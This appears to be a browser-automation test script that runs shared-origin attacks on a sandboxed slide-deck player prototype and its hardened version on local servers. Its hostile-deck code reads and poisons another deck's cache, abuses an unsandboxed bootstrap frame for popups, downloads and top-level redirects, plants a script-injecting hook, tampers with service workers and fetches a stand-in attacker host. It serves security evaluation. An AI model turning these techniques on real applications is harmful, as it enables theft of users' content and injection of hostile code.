// Q5: shared-origin attacks on the B1 prototype (v1) and on the hardened variant (v2). node q5.cjs [v1|v2|idle]
const L = require('./lib.cjs'); const fs = require('node:fs'); const H = require('./hostile/battery.js');
const part = process.argv[2] || 'v1'; const APP = 'http://localhost:4620'; const P1 = 'http://127.0.0.1:4621'; const P2 = 'http://127.0.0.1:4622'; const EVIL = 'http://127.0.0.2:4630';
const S0 = 'allow-scripts allow-same-origin'; const deck = (name) => ({ 'index.html': `<!doctype html><html><head><title>${name}</title></head><body><h1>${name}</h1><p>${name.toUpperCase()}-SECRET-SLIDES</p></body></html>`, 'sub.html': 'sub of ' + name });
const frameOf = (page) => page.frames().find((f) => f.url().includes('/vfs/'));
const state = (f) => f ? f.evaluate(() => ({ title: document.title, body: document.body.innerText.slice(0, 50), trojan: window.__trojan || null, controlled: !!navigator.serviceWorker.controller })).catch((e) => 'ERR ' + e.message.split('\n')[0]) : 'no /vfs/ frame';
(async () => {
  const app = await L.startStatic(4620, L.DIR + '/app'); const p1 = await L.startStatic(4621, L.DIR + '/player1'); const p2 = await L.startStatic(4622, L.DIR + '/player2'); const evil = await L.startEvil(4630);
  const browser = await L.realLaunch(); const out = { part, version: browser.version() };
  try {
    if (part === 'v1') {
      const context = await browser.newContext({ acceptDownloads: true }); const page = await context.newPage(); const seen = { dialogs: [], downloads: [], popups: 0 };
      page.on('dialog', (d) => { seen.dialogs.push(d.type() + ': ' + d.message()); d.dismiss().catch(() => {}); }); page.on('download', (d) => seen.downloads.push(d.suggestedFilename())); context.on('page', () => seen.popups++);
      await page.goto(`${APP}/app.html?player=${encodeURIComponent(P1)}`);
      await page.evaluate((f) => window.openV1({ files: f, sandbox: 'allow-scripts allow-same-origin' }), deck('Victim A')); out.A = await state(frameOf(page));
      await page.evaluate((f) => window.openV1({ files: f, sandbox: 'allow-scripts allow-same-origin' }), H.files); const h = frameOf(page); await h.locator('h1').click().catch(() => {});
      out.hostile1 = await h.evaluate(async (EVIL) => { const out = {}; const keys = await caches.keys(); out.cacheKeys = keys; const other = keys.find((k) => !location.pathname.includes(k.slice(4)));
        if (other) { const c = await caches.open(other); const reqs = await c.keys(); out.victimFiles = reqs.map((r) => new URL(r.url).pathname.replace(/^\/vfs\/[^/]+/, '')); const idx = reqs.find((r) => r.url.endsWith('index.html')); out.victimContentViaCache = (await (await c.match(idx)).text()).replace(/<[^>]+>/g, ' ').slice(0, 70);
          out.victimViaWorkerFetch = await fetch(idx.url).then(async (r) => r.status + ' ' + (await r.text()).replace(/<[^>]+>/g, ' ').slice(0, 50)); await c.put(idx.url, new Response('<!doctype html><title>POISONED</title>poisoned by hostile deck', { headers: { 'content-type': 'text/html' } })); out.victimAfterPoison = await fetch(idx.url).then(async (r) => (await r.text()).slice(15, 70)); }
        let boot = null; for (let i = 0; i < parent.frames.length; i++) { try { if (parent.frames[i] !== window && parent.frames[i].location.href.includes('sw-host')) boot = parent.frames[i]; } catch (e) {} } out.bootFrameReachable = !!boot;
        if (boot) { out.alertViaBoot = (() => { try { const s = performance.now(); boot.alert('deck speaking through the unsandboxed bootstrap frame'); return 'returned after ' + Math.round(performance.now() - s) + ' ms'; } catch (e) { return 'ERR ' + e.name; } })();
          out.ownAlert = (() => { const s = performance.now(); alert('own alert'); return 'returned after ' + Math.round(performance.now() - s) + ' ms'; })();
          try { const w = boot.open(EVIL + '/page?c=boot-popup&run=q5v1'); out.popupViaBoot = w ? 'popup window returned' : 'null'; } catch (e) { out.popupViaBoot = 'ERR ' + e.name; }
          try { const a = boot.document.createElement('a'); a.href = boot.URL.createObjectURL(new boot.Blob(['x'])); a.download = 'via-boot.txt'; boot.document.body.append(a); a.click(); out.downloadViaBoot = 'clicked'; } catch (e) { out.downloadViaBoot = 'ERR ' + e.name; }
          if (!EVIL.endsWith('#notop')) try { boot.eval('top.location = ' + JSON.stringify(EVIL + '/page?c=boot-topnav&run=q5v1')); out.topNavViaBoot = 'assigned'; } catch (e) { out.topNavViaBoot = 'ERR ' + e.name + ' ' + e.message.slice(0, 60); }
          boot.eval(`addEventListener('message', (e) => { const m = e.data; if (!m || m.type !== 'vfs-put') return; const f = m.files.find((x) => x.path === 'index.html'); if (!f) return; const txt = new TextDecoder().decode(f.bytes); localStorage.setItem('loot', txt.replace(/<[^>]+>/g, ' ').slice(0, 80)); f.bytes = new TextEncoder().encode('<script>window.__trojan = "code planted by an earlier deck"; document.addEventListener("DOMContentLoaded", () => { document.title = "TROJANED " + document.title; });<\\/script>' + txt).buffer; });`); out.hookInBoot = 'installed'; }
        localStorage.setItem('persist', 'left by hostile deck'); return out; }, process.argv[3] === 'notop' ? EVIL + '#notop' : EVIL).catch((e) => 'ERR ' + e.message.split('\n')[0]);
      await L.sleep(1200); out.hostile1Effects = { dialogsShownToUser: seen.dialogs, downloads: seen.downloads, popups: seen.popups, topUrlChanged: !page.url().startsWith(APP), attackerGot: evil.log.filter((l) => l.run === 'q5v1').map((l) => l.c) };
      if (page.url().startsWith(APP)) { await page.evaluate((f) => window.openV1({ files: f, sandbox: 'allow-scripts allow-same-origin' }), deck('Victim C')); out.C_openedAfterHostile = await state(frameOf(page));
        await page.evaluate((f) => window.openV1({ files: f, sandbox: 'allow-scripts allow-same-origin' }), H.files);
        out.hostile2 = await frameOf(page).evaluate(async () => { const out = {}; out.loot = localStorage.getItem('loot'); const regs = await navigator.serviceWorker.getRegistrations(); out.regs = regs.map((r) => r.scope);
          out.registerNarrow = await navigator.serviceWorker.register('/sw.js?planted=1', { scope: '/vfs/' }).then((r) => 'REGISTERED ' + r.scope, (e) => 'rejected ' + e.message.slice(0, 80)); out.unregisterRoot = await regs[0].unregister(); return out; }).catch((e) => 'ERR ' + e.message.split('\n')[0]);
        await L.sleep(500); await page.evaluate((f) => window.openV1({ files: f, sandbox: 'allow-scripts allow-same-origin' }), deck('Victim D')); out.D_afterUnregister = await state(frameOf(page));
        await page.reload(); await page.evaluate((f) => window.openV1({ files: f, sandbox: 'allow-scripts allow-same-origin' }), deck('Victim E')); const e = frameOf(page); out.E_afterReload = await state(e);
        out.E_seesLeftovers = e ? await e.evaluate(async () => ({ persist: localStorage.getItem('persist'), loot: localStorage.getItem('loot'), caches: (await caches.keys()).length, regs: (await navigator.serviceWorker.getRegistrations()).map((r) => r.scope.replace(location.origin, '') + ' <- ' + (r.active || r.installing || r.waiting).scriptURL.replace(location.origin, '')) })).catch((x) => 'ERR ' + x.message.split('\n')[0]) : null; }
      await context.close();
    }
    if (part === 'v2') {
      const context = await browser.newContext(); const page1 = await context.newPage(); await page1.goto(`${APP}/app.html?player=${encodeURIComponent(P2)}&fsrc=1`);
      const a = await page1.evaluate((f) => window.openV2({ files: f }), deck('Victim A')); out.A = await state(frameOf(page1));
      const page2 = await context.newPage(); await page2.goto(`${APP}/app.html?player=${encodeURIComponent(P2)}&fsrc=1`); const ho = await page2.evaluate((f) => window.openV2({ files: f }), H.files); out.bootReportSeenByHostileSession = ho.bootInfo.report; const h = frameOf(page2);
      out.A_afterSecondBoot = await frameOf(page1).evaluate(() => fetch('sub.html').then((r) => 'sub.html ' + r.status)).catch((e) => 'ERR ' + e.message.split('\n')[0]);
      out.hostile = await h.evaluate(async (cfg) => { const out = {}; out.cacheKeys = await caches.keys(); out.idb = (await indexedDB.databases()).map((d) => d.name); out.ls = Object.keys(localStorage); out.framesInParent = parent.frames.length;
        out.guessOtherToken = await fetch('/vfs/' + '0'.repeat(32) + '/index.html').then((r) => 'status ' + r.status, (e) => 'ERR ' + e.message); out.fetchBootHtml = await fetch('/boot.html').then((r) => 'status ' + r.status, (e) => 'ERR ' + e.message);
        out.victimTokenKnown = await fetch('/vfs/' + cfg.victim + '/index.html').then(async (r) => 'status ' + r.status + ' (only if the token leaks) ', (e) => 'ERR ' + e.message + ' (CSP path restriction; token given to the attacker for this probe)');
        out.listAttempt = await new Promise((res) => { navigator.serviceWorker.addEventListener('message', (e) => res(JSON.stringify(e.data))); navigator.serviceWorker.controller.postMessage({ type: 'list-attempt' }); setTimeout(() => res('no reply'), 1000); });
        const tok = location.pathname.split('/')[2]; const ask = (msg) => new Promise((res) => { const ch = new MessageChannel(); ch.port1.onmessage = (e) => res(e.data.type); navigator.serviceWorker.controller.postMessage(msg, [ch.port2]); setTimeout(() => res('no reply'), 1000); });
        out.overwriteOwnSession = await ask({ type: 'session', token: tok, files: [] }); out.overwriteVictimSession = await ask({ type: 'session', token: cfg.victim, files: [] });
        const t2 = [...crypto.getRandomValues(new Uint8Array(16))].map((b) => b.toString(16).padStart(2, '0')).join('');
        out.createSecondSessionWithChosenHeaders = await ask({ type: 'session', token: t2, headers: { 'x-note': 'no CSP' }, files: [{ path: 'index.html', type: 'text/html', bytes: new TextEncoder().encode(`<!doctype html><title>self-upgraded</title><h1>x</h1><script>fetch(${JSON.stringify(cfg.evil + '/x?c=self-upgrade-fetch&run=q5v2')}, {mode:'no-cors'})<\/script>`).buffer }] }); out.t2 = t2;
        localStorage.setItem('persist', 'left by hostile deck'); await caches.open('evil-cache'); indexedDB.open('evil-db');
        out.registerNarrowUnderCsp = await navigator.serviceWorker.register('/sw.js?planted=1', { scope: '/vfs/' }).then((r) => 'REGISTERED ' + r.scope, (e) => 'rejected ' + e.name + ': ' + e.message.slice(0, 90)); return out; }, { evil: EVIL, victim: a.token }).catch((e) => 'ERR ' + e.message.split('\n')[0]);
      if (out.hostile.t2) { await h.evaluate((t2) => { location.href = '/vfs/' + t2 + '/index.html'; }, out.hostile.t2).catch(() => {}); await L.sleep(1500); const h2 = frameOf(page2); out.selfUpgrade = { frameTitle: await h2.evaluate(() => document.title).catch((e) => 'ERR'), attackerGot: evil.log.filter((l) => l.run === 'q5v2').map((l) => l.c) };
        out.hostilePolicyFree = await h2.evaluate(async () => { const out = {}; out.registerNarrow = await navigator.serviceWorker.register('/sw.js?planted=1', { scope: '/vfs/' }).then((r) => 'REGISTERED ' + r.scope.replace(location.origin, ''), (e) => 'rejected ' + e.name + ': ' + e.message.slice(0, 90));
          const regs = await navigator.serviceWorker.getRegistrations(); out.regs = regs.map((r) => r.scope.replace(location.origin, '')); out.unregisterAll = (await Promise.all(regs.map((r) => r.unregister()))).join(','); return out; }).catch((e) => 'ERR ' + e.message.split('\n')[0]); }
      await L.sleep(500); out.A_afterHostileUnregistered = await frameOf(page1).evaluate(() => fetch('sub.html').then((r) => 'sub.html ' + r.status)).catch((e) => 'ERR ' + e.message.split('\n')[0]);
      const page3 = await context.newPage(); await page3.goto(`${APP}/app.html?player=${encodeURIComponent(P2)}&fsrc=1`); const b = await page3.evaluate((f) => window.openV2({ files: f }), deck('Victim B'));
      out.B_bootReport = b.bootInfo.report; out.B = await state(frameOf(page3)); out.B_leftovers = await frameOf(page3).evaluate(async () => ({ ls: Object.keys(localStorage), caches: await caches.keys(), idb: (await indexedDB.databases()).map((d) => d.name), regs: (await navigator.serviceWorker.getRegistrations()).map((r) => r.scope.replace(location.origin, '')) })).catch((e) => 'ERR ' + e.message.split('\n')[0]);
      out.A_afterThirdBoot = await frameOf(page1).evaluate(() => fetch('sub.html').then((r) => 'sub.html ' + r.status)).catch((e) => 'ERR ' + e.message.split('\n')[0]);
      out.pingBeforeStop = await page3.evaluate(() => window.ping());
      const cdp = await context.newCDPSession(page3); await cdp.send('ServiceWorker.enable'); await cdp.send('ServiceWorker.stopAllWorkers'); await L.sleep(800);
      out.afterWorkerStopped = { deckFetch: await frameOf(page3).evaluate(() => fetch('sub.html').then(async (r) => 'sub.html ' + r.status + ' ' + (await r.text()))).catch((e) => 'ERR ' + e.message.split('\n')[0]), appPing: await page3.evaluate(() => window.ping()) };
      await context.close();
    }
    if (part === 'idle') {
      const one = async (pingEveryMs) => { const context = await browser.newContext(); const page = await context.newPage(); await page.goto(`${APP}/app.html?player=${encodeURIComponent(P2)}&fsrc=1`); await page.evaluate((f) => window.openV2({ files: f }), deck('Idle')); const first = await page.evaluate(() => window.ping());
        const t0 = Date.now(); while (Date.now() - t0 < 50000) { await L.sleep(pingEveryMs || 50000); if (pingEveryMs) await page.evaluate(() => window.ping()); }
        const r = { pingEveryMs, firstPing: first, after50s: await frameOf(page).evaluate(() => fetch('sub.html').then(async (x) => 'sub.html ' + x.status + ' ' + (await x.text()))).catch((e) => 'ERR ' + e.message.split('\n')[0]), ping: await page.evaluate(() => window.ping()) }; await context.close(); return r; };
      out.idle = await Promise.all([one(0), one(10000)]);
    }
  } catch (e) { out.error = String(e.stack).slice(0, 600); }
  finally { await Promise.race([browser.close(), L.sleep(5000)]); for (const s of [app, p1, p2, evil]) await s.close(); }
  out.staticPlayer2Saw = p2.log.filter((l) => l.url.startsWith('/vfs/') || l.url.includes('planted')).map((l) => l.url.slice(0, 60)).slice(0, 8);
  fs.writeFileSync(`${L.DIR}/out/q5-${part}.json`, JSON.stringify(out, null, 1)); console.log(JSON.stringify(out, null, 1));
})();
